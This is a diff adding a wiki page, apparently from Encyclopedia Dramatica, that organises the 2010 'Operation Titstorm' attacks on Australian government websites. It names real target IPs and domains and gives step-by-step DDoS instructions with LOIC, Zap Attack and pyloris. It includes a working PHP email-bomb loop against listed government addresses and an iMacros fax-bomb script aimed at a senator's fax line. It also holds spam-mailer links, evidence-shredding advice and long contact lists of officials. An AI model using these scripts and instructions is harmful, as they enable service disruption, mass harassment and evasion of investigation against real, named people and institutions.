@@ -1,0 +1,609 @@
+Project Freeweb/Resource Center
+{{subpage|Project Freeweb}}
+
+{{freeweb}}
+
+:''See Also: [[Project Freeweb/Propaganda]] and [[Project Freeweb/Media]]''
+
+[[Image:Ausfagposter.jpg||thumbleft|400px]]{{notice|'''Australia fags - [[Australia]] [[IRL]]''' <br />There's going to be an in real life protest February 20th, [http://encyclopediadramatica.com/Operation_Titstorm_IRL click here for more info] or join [irc://irc.anonnet.org/projectfreeweb irc.anonnet.org #projectfreeweb]}}This is your one-stop-only for helping the operation. <br />If you DO manage to mess it out or want to become more involved go to IRC Channel [irc://irc.anonnet.org/projectfreeweb irc.anonnet.org #projectfreeweb]<br /> The fallback position is on anonymunculeIRC at [irc://irc.anonymuncule.com/titstorm irc.anonymuncule.com #titstorm]. <br />Make sure to search this article before asking in the IRC to avoid common questions. Once in the IRC feel free to ask, anons will help you figure it out.
+
+== Basic information ==
+*The [[Operation Titstorm]] article will get you briefed.
+*[http://mirror.wikileaks.info/wiki/leak/acma-secret-blacklist-18-mar-2009.txt Click here for a list of the websites that the ACMA (Australian Communications and Media Authority) intends to ban. It's believed to be current as of March 2009.]
+::*[[ACMA/Full_List|In addition, Encyclopedia Dramatica keeps copies of the lists and tracks their version histories. Click here to view.]]
+*Moar information and resource can be reached also here http://www.partyvan.info/wiki/Operation_Titstorm or here [http://74.125.155.132/search?q=cache%3Ahttp%3A%2F%2Fpartyvan.info%2Fwiki%2FOperation_Titstorm if the website is down]
+*Remember, the front-line command-center is [irc://irc.anonnet.org/projectfreeweb irc.anonnet.org #projectfreeweb] and if this IRC address doesn't work, please try  [irc://irc.anonymuncule.com/titstorm irc.anonymuncule.com #titstorm]
+* If you have haxing experience (SQL injection, remote shell,reverse engineering, XSS etc.) join [irc://irc.anonnet.org/titstormh4x irc.anonnet.org #titstormh4x]
+*If you don't have an IRC client/app, you can get access here https://www.mibbit.com/chat/?url=irc//:irc.anonnet.org#projectfreeweb
+*'''To be able to talk in the IRC''' send this text: <code>/msg nickserv register password email</code> Substitute password for any password you might want and email for your email. Create a new anonymous email account if necessary.
+*The squad Captain is Tootoot222, his principal lieutenants are Mitch, Alter, and Mooncup. Other guys running the show are Moose and Trixx. <s>[[User:MercWithMouth|MercWithMouth]]</s>(got de-opped and left), [[User:Infinite|Infinite]], <s>G0dfather</s>(scrap that, he was a troll), church0fscientology, and [[ODB]] of Encyclopedia Dramatica are also at hand, representing ED and keeping in contact with the media.
+
+== How To Help ==
+=== Create buzz ===
+*Dig this http://digg.com/politics/Say_Yes_To_Small_Boobs
+*Reddit this http://www.reddit.com/r/reddit.com/comments/b1jl7/operation_titstorm_say_yes_to_small_boobs/
+*If you know or are a journalist, reporter or any other media related person, publish an article about this.
+*If you have a blog, also do it faggot. Make buzz in facebak and in twitter.
+*When you promote this, forget the /b/tard talk and shit and speak like a normal person, or else you will get no serious attention at all.
+
+=== DDoSing ===
+'''When DDoSing, DO NOT USE A PROXY''' Since you will DDoS the proxy, not the targeted server.
+====PRIMARY DDoS TARGETS====
+*http://www.aph.gov.au/ IP: 164.75.16.230
+*http://www.minister.dbcde.gov.au IP: 203.9.222.73
+==== Browser DDoSing ====
+#Set the url to: [http://www.suasua.com/process.php?url=http://www.minister.dbcde.gov.au/&#038;refresh=.01] http://www.suasua.com/process.php?url=http://www.minister.dbcde.gov.au/&#038;refresh=.01
+#Copypaste it in mutiple windows and visit it.
+#???
+#PROFIT!
+==== Mac OS X ====
+#Download Zap Attack from here: http://www.cowfight.com/cf4/zapattack/zapattack21.sit
+#Uncompress it with [http://www.stuffit.com/mac/expander.html Stuff it Expander]
+#After uncompressing it open ZapAttack from the folder that got created, Intel macs will get prompted to install rosetta, do it. 
+#Then from File menu, choose Mass Connector.
+#The settings are the following:
+##Set IP to the primary targets in this article (or check the IRC Channel). Else: 164.75.16.230
+##Set port to: 80
+##Sockets: 100
+##Stop at: 0
+##Stay open for: 2 secs
+##Connect every: 4 secs
+#FIRE LAZORDS!!
+Or, if your really want to use LOIC for some reason, here is how,
+## install an app called winebottler from here http://winebottler.kronenberg.org/
+## download the LOIC.exe file
+## open the LOIC.exe file with winebottler
+## choose the option, open directly dont bother trying to make an app bundle it doesnt work.
+## Set LOIC up the same as the windows guys.
+## Fire LAZORDS!!! 
+That's all. Thanks for supporting La Resistance.
+
+==== Windows ====
+#Download LOIC from http://sourceforge.net/projects/loic/ <br>IMPORTANT: Only download it from sourceforge; NEVER DOWNLOAD IT FROM ANY OTHER LINK OR SITE.
+#Uncompress it and open
+#Set target to the primary targets in this article (or check the IRC Channel [irc://irc.anonnet.org/titstorm #titstorm]). Else: 164.75.16.230.
+#Click Lock on.
+#Leave Timeout at 9001, Set it to "not wait for reply".
+#Leave port at 80, use TCP, set threads to 1000 or more
+#FIRE LAZARS!!
+
+==== Linux ====
+#<s>Download http://sourceforge.net/projects/pyloris/ <code>python pyloris.py -l --socksversion  5 --socksport 9050 website.com</code> IMPORTANT: Make sure you have TOR installed! This method bypasses normal slowloris blocks! "Utilizing TOR should essentially eliminate the mitigating effects of ipchains, mod_antiloris, and mod_noloris."</s> - STOP DDoSING THROUGH Tor YOU FAGGOTS. it just makes the entire Tor network slow, and does not have much effect on the target.
+#As of ~6:30am Feb 12, Aussie time, www.minister.dbcde.gov.au is now mostly fortified against slowloris.
+
+==== Moar info on DDoS ====
+Also you can consult the Encyclopedia Dramatica article for additional general or specific information on how DDoS can help with Operation:Titstorm, the article is here. [[Denial_of_Service]].
+
+==== Regarding Possible Australian Counter-Measures ====
+*Windows: If you get a request to look at your computer, then just shred the binary with this program: [http://www.cylog.org/utilities/cybershredder.jsp] http://www.cylog.org/utilities/cybershredder.jsp
+*Mac OS X: Use [http://www.obdev.at/products/littlesnitch/index.html the Little Snitch] app [http://isohunt.com/torrent_details/137102749/little+snitch?tab=summary here] to deny weird access calls.
+*Linux: You should already have shred installed but [http://wipe.sourceforge.net/ wipe] is another option. Need to [http://www.freesoftwaremagazine.com/columns/shred_and_secure_delete_tools_wiping_files_partitions_and_disks_gnu_linux turn off journaling] for a second for it to work.
+
+====Other sites to hit====
+*http://www.minister.dbcde.gov.au/
+*http://www.immi.gov.au/ ( http://www.immi.gov.au/search/search.cgi?query=a&collection=dima-meta&form=simple&num_ranks=9001 <--- rapes their SQL and BandWidth)
+*http://www.austrade.gov.au/
+*http://www.dbcde.gov.au/
+*http://www.dsd.gov.au/
+
+===Performing Blackfaxing or E-Mail spamming===
+
+==== E-Mail Spamming ====
+#Go to http://10minutemail.com/ and get a disposable email.
+#Then use one of the following to send all the smalltit porn you have (or even just massive amounts of spam if you don't have the porn).
+*PHP MAILER #1 > http://www.heavenlycakesandmore.com/xm.php
+*PHP MAILER #2 > http://cosmositsolutions.com/xm.php
+*PHP MAILER #3 > http://www.alastrianlampoon.com/xm.php
+*MAILER SAUCE > http://www.heavenlycakesandmore.com/xm.txt
+
+You can also use http://www.sendanonymousemail.net/ but you can't attach images.
+
+==== Black Faxing ====
+*Download this document: http://www.mediafire.com/?m25jkltmghm (open office works fine so UNIXoperatives can open it too)
+:*Send that document via: http://www.freepopfax.com/
+*Faxzero blankfax (3 pages of black - because that's the limit): http://rapidshare.com/files/348916003/anon.docx.html or http://www.mediafire.com/download.php?jzxiiz4zo34
+:*Send via: http://www.faxzero.com/ (use a 10minutemail for verification)
+If you get a 403 or 404 message for any of these sites, reset your IP and try again.
+
+==== How to bomb their Emails ====
+An Addendum By: <s>FarBeyondDriven8</s>Anonymous.
+#Go to http://www.000webhost.com/order.php?aggree=yes Since they allow sendmail() for free, and they hired idiots to program their setupid forms. 
+#Sign up for a free account on 000webhost.com
+#Enter in all fake information, all you will need is to rememeber your password. There is no need for a real e-mail because they do not send conformation links.
+#After you sign up, allow the Account Setup to build. It won't take long. 
+#Go to the root directory of your file manager, create a PHP File with our bombing script in it. 
+#Press "Enter Control Panel"
+#Scroll down to "Files" select "File Manager" 
+#Click "public.html"
+#Now click "New File"
+#An empty box with the words "Enter code here" should appear. 
+#Enter the following:
+<code><nowiki>
+<?php set_time_limit(0); $emails = explode(', ', 'actman@fedcourt.gov.au, nswdr@fedcourt.gov.au, ntreg@fedcourt.gov.au, query@fedcourt.gov.au, qldreg@fedcourt.gov.au, sareg@fedcourt.gov.au, tasreg@fedcourt.gov.au, vicreg@fedcourt.gov.au, waregistry@fedcourt.gov.au, query@fedcourt.gov.au, alan.thompson@aph.gov.au, david.kenny@aph.gov.au, roxanne.missingham@aph.gov.au, judith.konig@aph.gov.au, Therese.Lynch@aph.gov.au, liz.bryant@aph.gov.au, nola.adcock@aph.gov.au, judy.hutchinson@aph.gov.au, terry.crane@aph.gov.au, bronwyn.graham@aph.gov.au, jane.romeyn@aph.gov.au, sheila.grant@acma.gov.au, chris.chapman@acma.gov.au, chris.chea@acma.gov.au, maureen.cahill@acma.gov.au, andrew.kerans@acma.gov.au, mark.loney@acma.gov.au, allan.major@acma.gov.au, olya.booyar@acma.gov.au, jonquil.ritter@acma.gov.au, kath.silleri@acma.gov.au, grant.symons@acma.gov.au, dianne.carlos@acma.gov.au, derek.ambrose@acma.gov.au, louise.harkness@acma.gov.au, paul.white@acma.gov.au, andree.wright@acma.gov.au, linda.caruso@acma.gov.au giles.tanner@acma.gov.au, mark.bidwell@acma.gov.au, david.brunfield@acma.gov.au, Brendan.Byrne@acma.gov.au, clare.oreilly@acma.gov.au, lais@acma.gov.au, SmartNumbers@acma.gov.au, antispamenquiries@acma.gov.au'); while(1) { foreach($emails as $e) { mail($e, "*CHANGEME*subject*CHANGEME*", "*CHANGEME*message*CHANGEME*", "*CHANGEME*From Email can be fake*CHANGEME*"); } } ?> 
+</nowiki></code>
+
+#Modify the addresses if necessary.
+#Name it index.php. It will create an infinite loop of emails to send to your victim. 
+#Click the Save icon at the top.
+#Click the Back button, next to the Save icon.
+#The script will then execute. 
+
+It is more than likely 000webhost will suspend your account for this action. But who cares? Now the victim has a MASSIVE ammount of mail to look forward too.. and you can always sign up for another one.
+
+====How to fax bomb====
+
+'''This has been fixed and should work now.'''
+
+#Download [http://download.mozilla.org/?product=firefox-3.6&os=win&lang=en-US Firefox] if you don't have it
+#Download the extension [https://addons.mozilla.org/en-US/firefox/downloads/latest/3863/addon-3863-latest.xpi?src=addondetail iMacros] if you don't have it
+#Download the Black Fax document [http://www.mediafire.com/?m25jkltmghm here] and save it to C:\
+#Open iMacros:
+[[File:Tut4.jpg]]
+#Scroll down until you see "Self-test.js", right click, click "Edit macro:"
+#Replace all code in this window with the following code:
+<code><nowiki>var macro;
+var jsLF = "\n";
+var i, retcode, errtext;
+var MyPosts;
+for (i=0;i<=0;i++) {
+var randomnumber1 = Math.floor(Math.random()*110);
+var randomnumber2 = Math.floor(Math.random()*1100);
+var randomnumber3 = Math.floor(Math.random()*1100000);
+var waitseconds = 8;
+macro = "CODE:";
+macro += "URL GOTO=http://www.freepopfax.com/" + jsLF;
+macro += "TAG POS=1 TYPE=SELECT FORM=NAME:send_form ATTR=ID:country_list CONTENT=%2739" + jsLF;
+macro += "TAG POS=1 TYPE=INPUT:TEXT FORM=NAME:send_form ATTR=ID:local_number CONTENT=262734154" + jsLF;
+macro += "TAG POS=1 TYPE=INPUT:TEXT FORM=NAME:send_form ATTR=ID:name CONTENT=CHANGETHIS" + randomnumber3 + jsLF;
+macro += "TAG POS=1 TYPE=INPUT:TEXT FORM=NAME:send_form ATTR=ID:email CONTENT=CHANGETHIS" + randomnumber1 + "@CHANGETHIS" + randomnumber2 + ".com" + jsLF;
+macro += "TAG POS=1 TYPE=INPUT:RADIO FORM=ID:send_form ATTR=ID:document_to_send_file" + jsLF;
+macro += "TAG POS=1 TYPE=INPUT:FILE FORM=NAME:send_form ATTR=ID:input_file CONTENT=C:\Document_for_the_blackfax.doc" + jsLF;
+macro += "PROMPT Captcha: !VAR1" + jsLF;
+macro += "TAG POS=1 TYPE=INPUT:TEXT FORM=NAME:send_form ATTR=ID:input_captcha CONTENT={{!VAR1}}" + jsLF;
+macro += "TAG POS=1 TYPE=INPUT:CHECKBOX FORM=NAME:send_form ATTR=ID:termsofuse CONTENT=YES" + jsLF;
+macro += "TAG POS=1 TYPE=A ATTR=TXT:Submit" + jsLF;
+retcode = iimPlay(macro);
+if (retcode < 0) {
+errtext = iimGetLastError();
+alert(errtext);
+}
+if (retcode < 0) {
+errtext = iimGetLastError();
+alert(errtext);
+break;
+}}
+</nowiki></code>
+#Remove all "CHANGETHIS" with anything
+#Click save and close
+#Open a new tab, click play
+#Enter the 4-letter captcha from the page into the iMacros popup and click OK
+#Wait for the page to say your fax was successfully received by the system
+#Click play again, repeat from step 4
+NB - If there is ever an issue with this number, replace "CONTENT=262734154" with any Australian number, just be sure to include the area code minus the 0! (Default number is Senator Conroy)
+
+===Administration and contact details===
+Postal Address:<br />
+Department of Parliamentary Services<br />
+PO Box 6000<br />
+Canberra<br />
+Australian Capital Territory<br />
+Australia 2600<br />
+
+Phone:
+(02) 6277 7111<br />
+(international: 61+ 2 6277 7111)<br />
+
+Fax:
+(02) 6277 5417<br />
+(international: 61+ 2 6277 5417)
+
+==== Stephen Conroy ====
+The main great evil, and antagonist, Stephen Conroy<br />
+senator.conroy@aph.gov.au<br />
+(02) 1300 131 546<br />
+
+
+==== Executive Staff ====
+'''Secretary - Mr Alan Thompson'''<br />
+Tel: (02) 6277 7100<br />
+Fax: (02) 6277 5417<br />
+email: alan.thompson@aph.gov.au
+
+'''Deputy Secretary - Mr David Kenny'''<br />
+Tel: (02) 6277 5533<br />
+Fax: (02) 6277 5417<br />
+email: david.kenny@aph.gov.au
+
+'''Parliamentary Librarian - Ms Roxanne Missingham'''<br />
+Tel: (02) 6277 7102<br />
+Fax: (02) 6277 2403<br />
+email: roxanne.missingham@aph.gov.au
+
+'''Chief Finance Officer - Mrs Judy Konig'''<br />
+Tel: (02) 6277 8818<br />
+Fax: (02) 6277 8800<br />
+email: judith.konig@aph.gov.au
+
+'''Assistant Secretary, Content Management Branch - Ms Therese Lynch'''<br />
+Tel: (02) 6277 2888<br />
+Fax: (02) 6277 8252<br />
+emial: Therese.Lynch @aph.gov.au
+
+'''Assistant Secretary, Product and Services Development Branch - Ms Freda Hanley'''<br />
+Tel: (02) 6277 8118<br />
+Fax: (02) 6277 5210<br />
+email: liz.bryant@aph.gov.au
+
+'''Acting Assistant Secretary, Research Branch - Ms Nola Adcock'''<br />
+Tel: (02) 6277 2470<br />
+Fax: (02) 6277 2528<br />
+email: nola.adcock@aph.gov.au
+
+'''Acting Assistant Secretary, Information Access Branch - Ms Judy Hutchinson'''<br />
+Tel: (02) 6277 7103<br />
+Fax: (02) 6277 2634<br />
+email: judy.hutchinson@aph.gov.au
+
+'''Assistant Secretary, Infrastructure Services Branch - Mr Terry Crane'''<br />
+Tel: (02) 6277 5001<br />
+Fax: (02) 6277 8999<br />
+email: terry.crane@aph.gov.au
+
+'''Acting Assistant Secretary, Building Services Branch - Ms Bronwyn Graham'''<br />
+Tel: (02) 6277 4700<br />
+Fax: (02) 6277 8252<br />
+email: bronwyn.graham@aph.gov.au
+
+'''Assistant Secretary, Future Outlooks - Ms Jane Romeyn'''<br />
+Tel: (02) 6277 8812<br />
+email: jane.romeyn@aph.gov.au
+
+===Email List Of Australian Officials===
+
+====Federal Court====
+*actman@fedcourt.gov.au
+*nswdr@fedcourt.gov.au 
+*ntreg@fedcourt.gov.au 
+*query@fedcourt.gov.au 
+*qldreg@fedcourt.gov.au
+*sareg@fedcourt.gov.au
+*tasreg@fedcourt.gov.au
+*vicreg@fedcourt.gov.au
+*waregistry@fedcourt.gov.au
+*query@fedcourt.gov.au
+
+====FAX List of Australian Officials====
+
+Federal Courts Faxes
+*(02) 6267 0625
+*(02) 9230 8535 
+*(02) 9230 8295
+*(08) 8941 4941
+*(07) 3248 1260
+*(07) 3248 1240
+*(08) 8219 1001 
+*(03) 6232 1701
+*(03) 8600 3281
+*(03) 8600 3351
+*(08) 9221 3261
+*(08) 9268 7208
+*(02) 9280 1381
+
+====Email Addresses====
+<pre>
+D.Adams.MP@aph.gov.au
+A.Albanese.MP@aph.gov.au
+Kim.Beazley.MP@aph.gov.au
+Arch.Bevis.MP@aph.gov.au
+B.Billson.MP@aph.gov.au
+Laurie.Brereton.MP@aph.gov.au
+Anna.Burke.MP@aph.gov.au
+Anthony.Byrne.MP@aph.gov.au
+David.Cox.MP@aph.gov.au
+S.Crean.MP@aph.gov.au
+J.Crosio.MP@aph.gov.au
+Michael.Danby.MP@aph.gov.au
+Graham.Edwards.MP@aph.gov.au
+Annette.Ellis.MP@aph.gov.au
+Craig.Emerson.MP@aph.gov.au
+Martyn.Evans.MP@aph.gov.au
+Laurie.Ferguson.MP@aph.gov.au
+M.Ferguson.MP@aph.gov.au
+J.Fitzgibbon.MP@aph.gov.au
+Jane.Gerick.MP@aph.gov.au
+Steve.Gibbons.MP@aph.gov.au
+Julia.Gillard.MP@aph.gov.au
+Alan.Griffin.MP@aph.gov.au
+Jill.Hall.MP@aph.gov.au
+Michael.Hatton.MP@aph.gov.au
+Kelly.Hoare.MP@aph.gov.au
+C.Hollis.MP@aph.gov.au
+Bob.Horne.MP@aph.gov.au
+Julia.Irwin.MP@aph.gov.au
+Harry.Jenkins.MP@aph.gov.au
+Cheryl.Kernot.MP@aph.gov.au
+Duncan.Kerr.MP@aph.gov.au
+M.Latham.MP@aph.gov.au
+Carmen.Lawrence.MP@aph.gov.au
+Michael.Lee.MP@aph.gov.au
+Kirsten.Livermore.MP@aph.gov.au
+Jenny.Macklin.MP@aph.gov.au
+S.Martin.MP@aph.gov.au
+R.McClelland.MP@aph.gov.au
+Jann.McFarlane.MP@aph.gov.au
+L.McLeay.MP@aph.gov.au
+Bob.McMullan.MP@aph.gov.au
+D.Melham.MP@aph.gov.au
+Allan.Morris.MP@aph.gov.au
+F.Mossfield.MP@aph.gov.au
+John.Murphy.MP@aph.gov.au
+Michelle.Obyrne.MP@aph.gov.au
+Gavan.Oconnor.MP@aph.gov.au
+N.Okeefe.MP@aph.gov.au
+Tanya.Plibersek.MP@aph.gov.au
+R.Price.MP@aph.gov.au
+Harry.Quick.MP@aph.gov.au
+Bernie.Ripoll.MP@aph.gov.au
+Nicola.Roxon.MP@aph.gov.au
+Kevin.Rudd.MP@aph.gov.au
+R.Sawford.MP@aph.gov.au
+Con.Sciacca.MP@aph.gov.au
+Bob.Sercombe.MP@aph.gov.au
+Sid.Sidebottom.MP@aph.gov.au
+Stephen.Smith.MP@aph.gov.au
+Warren.Snowdon.MP@aph.gov.au
+Alex.Somlyay.MP@aph.gov.au
+Wayne.Swan.MP@aph.gov.au
+Lindsay.Tanner.MP@aph.gov.au
+Kelvin.Thomson.MP@aph.gov.au
+Kim.Wilkie.MP@aph.gov.au
+Greg.Wilton.MP@aph.gov.au
+Christian.Zahra.MP@aph.gov.au
+Peter.Andren.MP@aph.gov.au
+Tony.Abbott.MP@aph.gov.au
+Kevin.Andrews.MP@aph.gov.au
+Fran.Bailey.MP@aph.gov.au
+Bruce.Baird.MP@aph.gov.au
+Phil.Barresi.MP@aph.gov.au
+Kerry.Bartlett.MP@aph.gov.au
+Bronwyn.Bishop.MP@aph.gov.au
+Julie.Bishop.MP@aph.gov.au
+Mal.Brough.MP@aph.gov.au
+A.Cadman.MP@aph.gov.au
+Ross.Cameron.MP@aph.gov.au
+Bob.Charles.MP@aph.gov.au
+A.Downer.MP@aph.gov.au
+T.Draper.MP@aph.gov.au
+K.Elson.MP@aph.gov.au
+Warren.Entsch.MP@aph.gov.au
+John.Fahey.MP@aph.gov.au
+C.Gallus.MP@aph.gov.au
+T.Gambaro.MP@aph.gov.au
+Joanna.Gash.MP@aph.gov.au
+P.Georgiou.MP@aph.gov.au
+Barry.Haase.MP@aph.gov.au
+Gary.Hardgrave.MP@aph.gov.au
+D.Hawker.MP@aph.gov.au
+j.Hockey.MP@aph.gov.au
+David.Jull.MP@aph.gov.au
+Jackie.Kelly.MP@aph.gov.au
+D.Kemp.MP@aph.gov.au
+Lou.Lieberman.MP@aph.gov.au
+Peter.Lindsay.MP@aph.gov.au
+Jim.Lloyd.MP@aph.gov.au
+Ian.Macfarlane.MP@aph.gov.au
+Margaret.May.MP@aph.gov.au
+Stewart.McArthur.MP@aph.gov.au
+J.Moore.MP@aph.gov.au
+J.Moylan.MP@aph.gov.au
+G.Nairn.MP@aph.gov.au
+B.Nelson.MP@aph.gov.au
+Peter.Nugent.MP@aph.gov.au
+C.Pyne.MP@aph.gov.au
+Peter.Reith.MP@aph.gov.au
+Michael.Ronaldson.MP@aph.gov.au
+Alby.Schultz.MP@aph.gov.au
+Patrick.Secker.MP@aph.gov.au
+Peter.Slipper.MP@aph.gov.au
+Andrew.Southcott.MP@aph.gov.au
+S.Stone.MP@aph.gov.au
+K.Sullivan.MP@aph.gov.au
+Cameron.Thompson.MP@aph.gov.au
+Andrew.Thomson.MP@aph.gov.au
+W.Tuckey.MP@aph.gov.au
+Danna.Vale.MP@aph.gov.au
+Barry.Wakelin.MP@aph.gov.au
+Mal.Washer.MP@aph.gov.au
+Michael.Wooldridge.MP@aph.gov.au
+T.Worth.MP@aph.gov.au
+John.Anderson.MP@aph.gov.au
+Larry.Anthony.MP@aph.gov.au
+Ian.Causley.MP@aph.gov.au
+Tim.Fischer.MP@aph.gov.au
+J.Forrest.MP@aph.gov.au
+Kay.Hull.MP@aph.gov.au
+Bob.Katter.MP@aph.gov.au
+De-Anne.Kelly.MP@aph.gov.au
+Tony.Lawler.MP@aph.gov.au
+Peter.McGauran.MP@aph.gov.au
+Garry.Nehl.MP@aph.gov.au
+P.Neville.MP@aph.gov.au
+Bruce.Scott.MP@aph.gov.au
+Stuart.St.Clair.MP@aph.gov.au
+W.Truss.MP@aph.gov.au
+Mark.Vaile.MP@aph.gov.au
+senator.allison@aph.gov.au
+senator.bartlett@aph.gov.au
+senator.bourne@aph.gov.au
+senator.greig@aph.gov.au
+senator.lees@aph.gov.au
+senator.murray@aph.gov.au
+senator.ridgeway@aph.gov.au
+senator.stottdespoja@aph.gov.au
+senator.woodley@aph.gov.au
+senator.brown@aph.gov.au
+senator.bishop@aph.gov.au
+senator.bolkus@aph.gov.au
+senator.campbell@aph.gov.au
+senator.carr@aph.gov.au
+senator.jacinta.collins@aph.gov.au
+senator.conroy@aph.gov.au
+senator.cook@aph.gov.au
+senator.cooney@aph.gov.au
+senator.crossin@aph.gov.au
+senator.crowley@aph.gov.au
+senator.denman@aph.gov.au
+senator.evans@aph.gov.au
+senator.faulkner@aph.gov.au
+senator.forshaw@aph.gov.au
+senator.gibbs@aph.gov.au
+senator.gibson@aph.gov.au
+senator.hogg@aph.gov.au
+senator.hutchins@aph.gov.au
+senator.ludwig@aph.gov.au
+senator.lundy@aph.gov.au
+senator.mackay@aph.gov.au
+senator.mckiernan@aph.gov.au
+senator.mclucas@aph.gov.au
+senator.murphy@aph.gov.au
+senator.obrien@aph.gov.au
+senator.quirke@aph.gov.au
+senator.ray@aph.gov.au
+senator.schacht@aph.gov.au
+senator.sherry@aph.gov.au
+senator.west@aph.gov.au
+senator.tambling@aph.gov.au
+senator.harradine@aph.gov.au
+senator.abetz@aph.gov.au
+richard.alston@dcita.gov.au
+senator.calvert@aph.gov.au
+senator.george.campbell@aph.gov.au
+senator.chapman@aph.gov.au
+senator.coonan@aph.gov.au
+senator.eggleston@aph.gov.au
+senator.ferguson@aph.gov.au
+senator.ferris@aph.gov.au
+senator.heffernan@aph.gov.au
+senator.herron@aph.gov.au
+senator.rod.kemp@aph.gov.au
+senator.knowles@aph.gov.au
+senator.lightfoot@aph.gov.au
+senator.ian.macdonald@aph.gov.au
+senator.mason@aph.gov.au
+senator.minchin@aph.gov.au
+senator.newman@aph.gov.au
+senator.payne@aph.gov.au
+senator.tchen@aph.gov.au
+senator.tierney@aph.gov.au
+senator.troeth@aph.gov.au
+senator.watson@aph.gov.au
+senator.boswell@aph.gov.au
+senator.mcgauran@aph.gov.au
+senator.harris@aph.gov.au
+</pre>
+
+== Media Reports ==
+
+''Add to this list if you find a media report not already here''
+
+* [http://news.ninemsn.com.au/technology/1010636/anonymous-brings-down-government-websites] Anonymous brings down government websites
+* [http://inquisitr.com/61057/anonymous-targets-australian-gov-over-censorship-in-operation-titstorm/] Anonymous Targets Australian Gov. Over Censorship In Operation Titstorm
+* [http://hackinthebox.org/index.php?name=News&file=article&sid=34967] Operation Titstorm: Hackers bring down government websites
+* [http://securitythreat.info/online-security-news/operation-titstorm-hackers-bring-down-government-websites/] Operation Titstorm: Hackers bring down government websites
+* [http://zgeek.com/content.php/929-Operation-Titstorm-Hackers-fighting-for-Aussies] Operation Titstorm: Hackers fighting for Aussies
+* [http://stuff.co.nz/technology/digital-living/3312167/Operation-Titstorm-hackers-strike-Australia] Operation Titstorm hackers strike Australia
+* [http://abc.net.au/news/stories/2010/02/10/2815605.htm] Pro-porn protesters target government websites
+* [http://channelnews.com.au/Content_And_Management/Industry/E4C6V5V6] Anonymous Attacks Australian Government Over Censorship
+* [http://smh.com.au/technology/technology-news/operation-titstorm-hackers-bring-down-government-websites-20100210-nqku.html?autostart=1] Operation Titstorm: hackers bring down government websites
+* [http://ibtimes.com.au/articles/20100210/there-wasbacklash-federal-governmentproposed-internet-service-provider-level-filtering.htm] Anonymous group protests against Australian Government filter
+* [http://smartcompany.com.au/politics/20100210-hackers-attack-government-websites-over-proposed-filter-legislation.html] Hackers attack Government websites over proposed filter legislation
+* [http://au.news.yahoo.com/a/-/latest/6786687/hackers-target-pms-website-in-protest/] Hackers target PM's website in protest
+* [http://www.dnews.de/nachrichten/netzwelt/178707/hacker-und-zensurgegner-legen-regierungswebseiten-lahm.html] Hackers and censorship opponents paralyze government websites 
+*[http://trueslant.com/barrettbrown/2010/02/10/anarchy-in-the-everyday-the-late-great-nation-state/] Anarchy in the Everyday; The Late, Great Nation State [LAWL]
+* [http://www.thepunch.com.au/articles/website-attacks-spread-throughout-government/] Website attacks spread throughout Government
+* [http://computer.t-online.de/hacker-angriff-auf-australien-als-protest-gegen-geplanten-internet-filter/id_21684912/index] Australia under fire over cyber-porn-blocking
+* [http://www.ibtimes.com/articles/7219/20100210/hackers-attack-au-websites-protest-censorship.htm] Hackers attack AU websites to protest censorship
+* [http://news.bbc.co.uk/2/hi/technology/8506698.stm] Political hacktivists turn to web attacks
+* [http://translate.google.com.br/translate?u=http%3A%2F%2Fg1.globo.com%2FNoticias%2FTecnologia%2F0%2C%2CMUL1485317-6174%2C00.html&sl=pt&tl=en&hl=&ie=UTF-8] Hackers attacked the Australian government through a filter against pornography
+* [http://www.facebook.com/l.php?u=http%3A%2F%2Fwww.mikropc.net%2Fkaikki_uutiset%2Farticle373459.ece%3Fs%3Dr%26wtm%3Dmikropc%2F-10022010&h=1773156ec188db9c22ec894551f3bd0a] Finnish Media Coverage
+* [http://yro.slashdot.org/story/10/02/10/1459257/Hackers-Attack-AU-Websites-To-Protest-Censorship?art_pos=1] Slashdot: Hackers Attack AU Websites To Protest Censorship
+* [http://www.theregister.co.uk/2010/02/10/aus_gove_ddos_protest/] TheReg: Activists unleash Operation Titstorm on Aussie.gov
+* [http://www.wired.com/threatlevel/2010/02/anonymous-unfurls-operation-titstorm/] Wired: Anonymous Unfurls ‘Operation Titstorm’
+* [http://www.cbsnews.com/stories/2010/02/10/ap/tech/main6194751.shtml?tag=mncol;lst;2] CBS: Hackers Disrupt Australian Government Web Sites
+* [http://www.securecomputing.net.au/News/166860,australian-government-websites-blitzed-by-ddos-attack.aspx] australian-government-websites-blitzed-by-ddos-attack.aspx
+* [http://www.securecomputing.net.au/News/166993,anonymous-blasts-government-sites-for-second-day.aspx] anonymous-blasts-government-sites-for-second-day.aspx
+* [http://www.independent.co.uk/news/world/australasia/operation-titstorm-hackers-declare-cyber-war-on-australia-1895838.html] "Operation Titstorm" hackers declare cyber war on Australia
+* [http://www.digitaljournal.com/article/287354] Activists take down Australian government websites
+* [http://www.heraldsun.com.au/news/breaking-news/filter-protesters-continue-attacks-on-parliament-house-website/story-e6frf7jx-1225829159854] Filter protesters continue attacks on Parliament House website 
+* [http://news.smh.com.au/breaking-news-national/hackers-target-pms-website-in-protest-20100210-ns02.html] Hackers target PM's website in protest 
+* [http://www.theaustralian.com.au/australian-it/parliament-website-downed-by-hackers/story-e6frgakx-1225828844405] Filter protesters down parliament website
+* [http://www.nzherald.co.nz/compute/news/article.cfm?c_id=1501832&objectid=10625493] Operation Titstorm - Hackers declare war on Aussie
+* [http://www.huffingtonpost.com/barrett-brown/anonymous-australia-and-t_b_457776.html] Anonymous, Australia, and the Inevitable Fall of the Nation-State
+* [http://tvnz.co.nz/world-news/australia-govt-websites-hacked-3359228] Australia govt websites hacked
+* [http://news.bbc.co.uk/2/hi/technology/8513073.stm ] 
+Cyber attacks against Australia 'will continue'
+
+Media contact information is being gathered so that we may spread the story around, a draft of this list can be found at http://etherpad.com/3cFQp2oB3e and will be transferred to here after it is finalized. All are welcomed to add newspapers and TV shows to the list.
+
+== Letter to the government ==
+
+'''Open letter concerning Australian Internet Censorship.'''
+''To whom it may concern, and for the unaware public.''
+
+Do not be confused about the intentions behind our attacks on various Australian government websites. Various media have falsely reported that our efforts are in defence of pornography. This is not about pornography. This is about freedom. The fact remains that under this proposed Internet censorship scheme over time the freedoms of Australians will continue to be eroded, all in the name of saving us from a threat that exists only in the minds of a vocal and very uninformed minority who wish to impose their morals and values on the public at large. We are in no way encouraging child pornography; however other courses of action should be encouraged, for Australia's "Cyber Safety Plan" creates problems in itself.
+
